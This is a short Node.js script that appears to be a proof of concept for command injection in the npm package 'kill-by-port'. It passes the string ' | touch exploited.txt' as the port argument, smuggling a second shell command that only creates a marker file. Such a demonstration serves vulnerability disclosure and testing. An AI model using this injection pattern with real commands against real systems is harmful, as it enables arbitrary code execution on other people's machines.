const pkg = require('kill-by-port');

const payload = " | touch exploited.txt";

console.log(pkg);

const port = payload;

pkg.killByPort(port);